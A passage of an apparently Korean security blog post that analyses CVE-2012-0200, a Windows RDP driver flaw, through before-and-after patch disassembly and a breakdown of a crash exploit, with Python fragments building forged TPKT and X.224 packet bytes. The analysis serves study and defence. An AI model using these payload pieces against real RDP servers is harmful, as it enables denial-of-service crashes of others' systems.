number\">910</span>         mov     al<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span></code></pre></div>\n<p><strong>2. CVE-2012-0200 취약성 업데이트된 RDP 드라이버 (v6.1.7600.16963)\n부분</strong></p>\n<p>업데이트 후 코드 블록을 살펴보면 취약점이 존재했던 버전에서\nWDLIBRT_MemFree() 함수를 호출하는 것을 잊어버렸다는 사실을 알 수있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">913</span>         lea     eax<span class=\"token punctuation\">,</span> \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">916</span>         push    eax\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">917</span>         push    \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">91</span>A         add     esi<span class=\"token punctuation\">,</span> <span class=\"token number\">74</span>h\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">91</span>D         push    esi\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">91</span>E         call    SListRemove\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">91</span>E                                       <span class=\"token punctuation\">;</span> 추가된 코드 블록 부분\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">923</span>         mov     eax<span class=\"token punctuation\">,</span> \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>          <span class=\"token punctuation\">;</span> EAX 포인터 복원 부분\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">926</span>         cmp     eax<span class=\"token punctuation\">,</span> ebx              <span class=\"token punctuation\">;</span> <span class=\"token constant\">NULL</span> 값과 비교\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">928</span>         jz      <span class=\"token keyword\">short</span> quit            <span class=\"token punctuation\">;</span> 만약 <span class=\"token constant\">NULL</span> 값이면 QUIT\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">92</span>A         cmp     \\<span class=\"token punctuation\">[</span>eax<span class=\"token operator\">+</span><span class=\"token number\">5</span>\\<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> bl\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">92</span>D         jnz     <span class=\"token keyword\">short</span> quit\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">92F</span>         push    eax                   <span class=\"token punctuation\">;</span> Pool Memory 해제\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">930</span>         call    WDLIBRT_MemFree\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">935</span> quit<span class=\"token operator\">:</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">935</span>         mov     al<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n\n<span class=\"token operator\">*</span><span class=\"token operator\">*</span>\\\n<span class=\"token operator\">*</span><span class=\"token operator\">*</span></code></pre></div>\n<p><strong>3. Pool Memory 블록을 할당한 후 해제하는 함수 ExFreePollWithTag()</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0 WDLIBRT_MemFree proc near   <span class=\"token punctuation\">;</span> <span class=\"token function\">ExFreePoolWithTag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>함수의 wrapper\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0 P               <span class=\"token operator\">=</span> dword ptr  <span class=\"token number\">8</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0         mov     edi<span class=\"token punctuation\">,</span> edi\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA2         push    ebp\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA3         mov     ebp<span class=\"token punctuation\">,</span> esp\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA5         push    <span class=\"token number\">0</span>           <span class=\"token punctuation\">;</span> Tag값은 <span class=\"token constant\">NULL</span> 인 상태\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA7         push    \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>     <span class=\"token punctuation\">;</span> P \\<span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> pool pointe<span class=\"token punctuation\">,</span> 인수로 전달한다<span class=\"token punctuation\">.</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BAA         call    ds<span class=\"token operator\">:</span>ExFreePoolWithTag\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BB0         pop     ebp\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BB1         retn    <span class=\"token number\">4</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BB1 WDLIBRT_MemFree endp</code></pre></div>\n<p>※ wrapper 함수: 기존에 함수를 한 번 감싸고 원래 동작에 기능 처리를 추가하는 함수</p>\n<p>※ Memory pool: C의 malloc, C++의 new 연산자와 유사한 메모리 동적할당을 가능하게 해준다.</p>\n<p>다른\n점은 malloc, new 연산자 같은 기능들은 다양한 블록사이즈 때문에 단편화를 유발시키고</p>\n<p>조각\n화된 메모리들을 퍼포먼스 때문에 실시간 시스템에서 사용할 수 없는 문제로 인해 Memory Pool을</p>\n<p>사용한다. 효율적인 방법으로 동일한 사이즈의 메모리 블록들을 미리 할당해 놓고 특정 트리거에 의해</p>\n<p>애플리케이션 이 필요할 때 마다. 메모리 블록들을 할당하고, 접근하고 해제할 수 있다</p>\n<p>RDP 드라이버 패치 전 버그 부분에서 Pool Memory 해제를 하지 않았다는\n사실을 알 수 있다. 해당 버그를 통해서 발생한 취약점이 루이지 아우라엠\n(Luigi Auriemma)이 보고한 CVE-2012-0200 취약점이다. 루이지 아우리엠은\nTCP/3389에서 RDP 서비스를 실행하는 취약한 서버를 충돌시키는 패킷을\n발표하였다.</p>\n<h2 id=\"공격-코드\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C\" aria-label=\"공격 코드 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 코드</h2>\n<h3 id=\"공격-코드-분석\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"공격 코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 코드 분석</h3>\n<p>공격코드는 크게 선언, 대상 서버로 전송되는 RDP 패킷 변조 페이로드 구성,\n대상 서버로 전송, BSOD 발생여부로 나눌 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 333px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 78.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADhUlEQVQ4y11UO48bVRS+SEhUEBAIkWQde573Ne/HnbHHj3W82eyuvd51kvU+sjjJ7ogFBQpEQQEFQkgIyUBjKJBo6JGQiCl4/AVaBAUNEilCqCiQyPiie2NHqxRH35lzvnvunDPfHECs9CNipT8ZMCwhwt5GhHGI4wIRVkAczxBhM9dvzBwvmzlefe7XZyI3zxdzPkeEvQv8sMVZ2uG6GXyJCPsN4lgUfDAvLEj84PAVvrN7xPOTN/no5m1+49brnFjpozzC8YO5/wdAhH2DCLsLMWOIsM9kIcJm8xvlIUwTaaLIAk9feIr/BTBgCBTNFYUBFkaTkFhpHdOkRu1qhmmaPX1mKXvu+Ur20jko7ZlnSxmmSUasVGAN06SBaRJgygDQzWCoGf57XtB6ChF2ZKLoR80I7hgwnKq6NxU4uDqabg0Op+1Of9pq96ZXrt2Ymiia6mYg0YDhHXEOETYCQbTMm8tdMcOvII7/pHaVR6zNXb8hZxvGbX44epXv7ue819+XsxTPtptxL2hywXe8ukSI43+B6zd+FR/GRPFtVfd/zhrrfO8g593NPX7z+A0+uDrim1sHvLM64FuDQ+lv9IYyPtw75u1On693h5ylK1wzgl/ACy9qZ86XsKIZPkA0WTJRdKxobm6iKFd1L9fNIMc0yYmVSoM4zi2nmiPCJEegDkPhH2GangUmijxF8zYV1QUQsyYi7HNMk4miuRNF9yZlxZmUytakrNjSKqozWbpAJxXVlb7gCf5cITXgBc1/sua6mOHHiLDfxec3YCRbXNvYkXO7Nrw1b3WXdy5ty3ZFToyl0drgBgznMmJ/Acer/x0nF0XwQyFskTBRxJvtHm+0ury53OP97ev84sq2vKTeXOcrqwOZu3T5yuMF7wrZuIrmblYUW7Rch5h9iggbV1R3XFGdcVmxx6ULVKIwRXPHpTJ9lFNUdyz4EMefIMJS0O70AQDgCSFwiJnQYiIS1K4m1K6mtpulmuGnZ8/DtKI6EnUzkHHLqUme4CPCGKLJk8Byaj8E0fJ9A4ZdRNh3i19uYaJ9IaussSb1Wa1f5n7YlPHHuYiw76WwhZZ0M/gWEXZvvhz+ExsEU1Zohl+srA6K6y+fFL3+fnHy2lvF2sZOoepegWkiN83DZSLPcfEvv6ObwdfUrp5DhH1wan0t1tPMgOFM1b2ZbgbSX8QXiB6ieMP3/wd1oKU6sv+hzQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image31\"\n        title=\"image31\"\n        src=\"/static/d496ae5b627a46e7a7ee27970d136a42/24c7e/image31.png\"\n        srcset=\"/static/d496ae5b627a46e7a7ee27970d136a42/e9ff0/image31.png 180w,\n/static/d496ae5b627a46e7a7ee27970d136a42/24c7e/image31.png 333w\"\n        sizes=\"(max-width: 333px) 100vw, 333px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>1. 공격 코드 RDP 패킷 변조</strong></p>\n<p>RDP 연결과정에서 발생되는 패킷의 변조를 통해 페이로드가 작성된다. 크게\nClient MCS Attach User Request PDU, maxChannelids filed, RDP connection\nrequest 부분으로 나눠진다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 114.44444444444446%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAXCAYAAAALHW+jAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAF7UlEQVQ4y4WVSWxbxx3G/5ItkrIi27KcyLUSJ7aSOOImkhLF7ZEU9+WRT2/l476J1OrYpqV4i+NESF00p/bUW089FZCc9Fa0LopeUvTiOM0hQHsJeiuQXtoeDFOYr6Ckprn1D3wYzGDwm+8PzMxHLzSN0GxSYmqKBjVE/7cGW04Q0WkimhkiukJEV66MjV2dMplm6IWqnkWj8VL8lVcmiOjCENEPiOgSEb1GRBePNU1Exu9BXz7WWePw8OSVsbHz2N01Ahii55r26vNq/XR8+tUpOjlyyWgwvj4yYnhrxGC4bDAYLxtNpssmk2nmtUtvjF52+wxkOjU5ajo1YTKdOmM0jU6Onjx57lO//9w/FWXsq3TaRCho0xTIEI5OPnksExEZ/isA1Giv0zcApYgmj9eHj11P/tLnP4duZ/TfimKkX8l6Vs5pn3P++J8SKfFpJCE8TWXlL8Ox3LNlqfSst33vi9t3H/7x9v2PnnzwyU9+pxXbTyw2368druBvXAvh37oXIu8A/xr+WhDHUSwa6GdiIZ9JSUgsFyEUm0jJFSi1LrJqDflCA2K5DbW+CmEwtrYQzGowWzyw2n2wzflhs3qXBq19KYjjTNcN9FNBSyRj+QOxvHFQatw8kArrB2p58yCvdA9kff27uV671a+37/WjMf1g1rrYt80F+nYnB7PN5x8AvxKkcQyAj5YL4UxShCx0oZXWmaiuQCmuIi+3IGsdiPIKNH0NstaFVGshEhUxZ/cxl5NjLlcQQScXxrd/OPHnQcsD4AdyyS9kFAiVGlMbK4wvVKA02uALVcjtNsSVNpRuB+rmGsRuE34+gUV7gHlcHPPNh6AthpNHDo+BUaE4m8ooCBZEltVLLKkUINeayFVqkFfbSBd0qK0u9NYGSt1NLGU1WOYCzOYKsrn5EN6wer09Lk5P8+JLh0Ce163x5DIK0hpbX73L7mz+CHfefYSdax9jp/MRbpYfoFd/iI5yA+tqD1q8BpfTzxacHOO8MfCL4SjRefqbop6HrhspGpOswaUMCrEyK2YaLBUREYvwCHFpxOIC4ollKPkK8qkC9OUGcpwAh93LFhwB5nYFkZ4PRgctPxOVgcMh8sZlcyjCQ8rXWKtxnZX0dbTq76LZuoVmu4dG9TpazR4UvYta+yaCcQlmm5fZHByz2P140+LxpeeDh68Cuk50jdfcfEJARq2xZa3B0vkicnIFybyOrFBANCkildewFM8jK5XAZVVYrV5mdwTY4T20+QJvWTyUnA+eYAPgHUEPpNISUmoNglplqXwBklyBWuqi1NyCWl5FrXMThcoaGms9cHERZquXOVxBZrX7MWtZDMyaF2nW4hk+tHk9r3sSyWXoUgvr3R3Wql/HVnsburICXahCyhRREhuQ0jqqUhN8SISfS7JwhGeReB4OFxdwzQdpwb10BPyEV+KpKA8lprFMWmaJmMBSaZGlExIT80WWSSlMyOosGRWZxJeYEFWZYyHE5lxB5vZE4XByAacrSA5X6Aj446yS4CJZCEtqv5yr96VEqV/iG/1iutYX03o/n9D6ilzpC4Le1/VGPxBI9O027wub3deftXqY2eLxmy2e/7X8iJfTS5EclnQJyo0OhNUKpI0KhG4VolKHoNahbHQhrrah9zYR5nMIOThEAwlw4QwslsWQxeIh25z/CPjzZc2bSIif8Y3u4+qte4/vP9za293t7L3/fmdvd3tz/8Pe2v4Pt6/tP9jq7D9679p+OSfsSVxqvxDPfWafD31qMS++c3XWTRar9yg9UNSniimZ+G6V9Ifb9Ptvn9Dn/3hMe1/8gh7cvkMf371PvRvvkdreoNWd+xRLK0QXZoloitLhNJ173UZX33aRxeY9+qKfa9r0X9XiuGC1nDGePXPRNGqcN50yOo2jxoVRk8l5YmTE6754cQbbO6e/rlYn/qKXJr5RCy8/VfVxetM93HaHhma+D3yh69PodCZSFy4MwujqcYq9TURmIpodIjozSLq/KwphZYVQqRypXCZUq4disvxdfP0H22N9E0Qxy34AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image32\"\n        title=\"image32\"\n        src=\"/static/1be439890c11143de1679b36745ebe81/32056/image32.png\"\n        srcset=\"/static/1be439890c11143de1679b36745ebe81/e9ff0/image32.png 180w,\n/static/1be439890c11143de1679b36745ebe81/f21e7/image32.png 360w,\n/static/1be439890c11143de1679b36745ebe81/32056/image32.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>2. RDP 연결 요청 인코딩 패킷 바이트 변조</strong></p>\n<p>TPKT, X.224, COTP 패킷 바이트를 추가한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.222222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAIAAABR8BlyAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAARUlEQVQI12Mwt3KxtXWvd/OdGhAyJSh8qn/o1MDwFt/gLv+QPHd/Z3tPT3tPD3sPN3sPN1t3PQNrPUMbPQMbfUMbbV1LAFd+EcfDTb3TAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image33\"\n        title=\"image33\"\n        src=\"/static/6f577cca3a322b0b49a2817112615a7f/0a47e/image33.png\"\n        srcset=\"/static/6f577cca3a322b0b49a2817112615a7f/e9ff0/image33.png 180w,\n/static/6f577cca3a322b0b49a2817112615a7f/f21e7/image33.png 360w,\n/static/6f577cca3a322b0b49a2817112615a7f/0a47e/image33.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 546px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 70.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACUElEQVQoz4WQbU/TUBTH+50ICUowi5EsKkGDAV4wtu557lFBUMAIMybqx1Kj+GIEttrOri20ve16e7tu3bquvbhQA0OIgPGX8+Lck/M/9/wPEY1lk+lSIlVMpIrJVDGZLsYS+UJp/fWbdzvl93NPQrOPFnP51XiqECbTS8uJSDQdjeeS6VI0niM8z/Nv4uTkxPf9QnFt4vY0hND3fdM0AZAhhCOJ4ziE67qjboyxpjV1XT8+Pr4Ul9Ymp4JHRyLGWBAElmU5jmuq6mAwMFstQhQlhAyo67qOEDIQMnQdneaGYVlWNrdyJ/CgUtmTAfj2dffT5y+7u98rlT1Jkuv1n0SEzMSThVgifyXWX21vlz/ML0Smg49Dy8loLBsKp5ZCiQiZIWPZMJkJkxlC15Ft93s9+0p0Ol3b7qczzyangjTNUNSP/f2DWo06qFar1VqtRskyuPR848FebmwH788pioqQzrLs4eEhwzA8z1uW1em0CcdxLlqvs7lVfjizoCiq67o8LwiCIIoihNBxnHa7Tdi2jTH2/mZU8X1/ZXUzcHcGAMU0TYqiJEliWVZV1V6vZ5omgRCSzpBleZQAAFRVlWWAMc7lV8fGAxqEhmHQNN1oNARBYBgGQmjb9vna//L8NPt8bDygNpvD4RAAUK/XR6Mxxt1u99LzBX+epyM2tnZmZhdZlgUANBoNiqI4jtM0TZIkTdP+83Ou8GLi1j2eF2RZ5jhOFEWe50VRpGn61LNlWdcP5nme67rD4a/y24/zi6SiKIPBgDtjJO73+61W6zdmcKRy/e5m7QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 6 1\"\n        title=\"image 6 1\"\n        src=\"/static/0f10d19d14e33c6c5f4ab8fdea1fa850/76aed/image-6.1.png\"\n        srcset=\"/static/0f10d19d14e33c6c5f4ab8fdea1fa850/e9ff0/image-6.1.png 180w,\n/static/0f10d19d14e33c6c5f4ab8fdea1fa850/f21e7/image-6.1.png 360w,\n/static/0f10d19d14e33c6c5f4ab8fdea1fa850/76aed/image-6.1.png 546w\"\n        sizes=\"(max-width: 546px) 100vw, 546px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>RDP 연결 요청 인코딩 부분의 패킷 바이트를 변조한 여부를 페이로드\n부분에서 확인할 수 있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">buf<span class=\"token operator\">=</span>\\\"\\\"\n\nbuf<span class=\"token operator\">+=</span>\\\"\\\\x03\\\\x00\\\\x00\\\\x13\\\" \\# TPKT<span class=\"token punctuation\">,</span> Version <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> lenght <span class=\"token number\">19</span>\n\nbuf<span class=\"token operator\">+=</span>\\\"\\\\x0e\\\\xe0\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x08\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\" \\# ITU<span class=\"token operator\">-</span>T Rec X<span class=\"token punctuation\">.</span><span class=\"token number\">224</span></code></pre></div>\n<p>※ TPKT: 캡슐화 프로토콜이며 OSI 패킷을 자체 패킷의 데이터 페이로드로\n전달한 다음 결과 구조를 TCP</p>\n<p>프로토콜 통신으로 전달한 다음 패킷을 TCP/IP 패킷으로 처리한다.</p>\n<p><strong>3. Client MCS Attach User Request PDU 패킷 바이트 변조</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 6.666666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAT0lEQVQI1yXDOwqAMBBAQc8j4l/cfIgB3TWVV7C29eLvChYOTLV6ZZkSTy6858WdDOcOxCs+GPOSEaeI7GgwNBpnKmTZaftIN/zHaaNuhA9LQCE3OURzdwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image34\"\n        title=\"image34\"\n        src=\"/static/12a6ed143d08c18d2111c414c9975cb1/0a47e/image34.png\"\n        srcset=\"/static/12a6ed143d08c18d2111c414c9975cb1/e9ff0/image34.png 180w,\n/static/12a6ed143d08c18d2111c414c9975cb1/f21e7/image34.png 360w,\n/static/12a6ed143d08c18d2111c414c9975cb1/0a47e/image34.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>패킷 바이트 변조</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 548px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABcUlEQVQY0y2P2UrDUBCG8yzircu1voNeindaEotgGwQFcaMVQd9FilXrQkW9cclSV2yTNl0kWEpo6aEJ5JyTk2QkiR8zF/8w8/8MJyuqrCiPTy+FwunJSaFUupIVVa28fnx+qZXXWk3/rtbu7h7OLy6LZxfXN+Vi8fz5WZIkRZIUTkiL/Eo2KiHLCxleyKb4NXF9K5c/3tjcnZtfXFhcFtKisCLyQmZpeTXFr0UyLaaEDAcAEIZRh2EQBIlkngcAkqROTM3s7R8CACXEcRxN0yzLYoxRShFCXLwcAsBwODRNkxACAInL2/vH5PRsLn/k+6zX67XbbcMwOp12t/uLYrggCBnzGfO9fxhjPqVRsqxUxsant3cOAGAwGPT7fU3TTNNECDmOEx17nkdiXNcdjUaUUkIIxpgx1v3tlm/vZVlptVpxZqdarTYaDcMw/pMxxq7rYoxt27YsK3FJJgih5B1d15vNZr1e/4nRdd22bUrpH26sU0PpELXVAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 6 1 1\"\n        title=\"image 6 1 1\"\n        src=\"/static/ffcbd3ec1c6f658afe738dd2d88abcd5/a58fe/image-6.1.1.png\"\n        srcset=\"/static/ffcbd3ec1c6f658afe738dd2d88abcd5/e9ff0/image-6.1.1.png 180w,\n/static/ffcbd3ec1c6f658afe738dd2d88abcd5/f21e7/image-6.1.1.png 360w,\n/static/ffcbd3ec1c6f658afe738dd2d88abcd5/a58fe/image-6.1.1.png 548w\"\n        sizes=\"(max-width: 548px) 100vw, 548px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>바이트 변조</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">buf<span class=\"token operator\">+=</span>\\\"\\\\x03\\\\x00\\\\x00\\\\x08\\\" \\# TPKT<span class=\"token punctuation\">,</span> Version <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> length <span class=\"token number\">8</span>\n\nbuf<span class=\"token operator\">+=</span>\\\"\\\\x02\\\\xf0\\\\x80\\\" \\# ITU<span class=\"token operator\">-</span>T Rec X<span class=\"token punctuation\">.</span><span class=\"token number\">224</span></code></pre></div>\n<p><strong>4. Connect-Initial영역의 targetParameters 필드 패킷 바이트 변조</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAoklEQVQI1xXN3Q6CIBgAUJ+nGf61WYISIPBhIKjDbN63bnz/2+YLnJM8sLzVnDO7g9/UuMMUdaDcCRm4cJRZxm33NKQDJlx9F0XVoQynqMmKNiEdYAp+WA4fvy4e0/bzb66C0rOGSZtZ6SDkKFSAYWmIuqR1XrYox1fUJJQNQnrnP8ZFpSZtll6fZw8zmHmw0br1ZVcJp9VgmaJHVhKU46Kif3hYMIa4K5QhAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image35\"\n        title=\"image35\"\n        src=\"/static/3f636ecfcdc678008ddd12c02f89b2a2/d8f62/image35.png\"\n        srcset=\"/static/3f636ecfcdc678008ddd12c02f89b2a2/e9ff0/image35.png 180w,\n/static/3f636ecfcdc678008ddd12c02f89b2a2/f21e7/image35.png 360w,\n/static/3f636ecfcdc678008ddd12c02f89b2a2/d8f62/image35.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 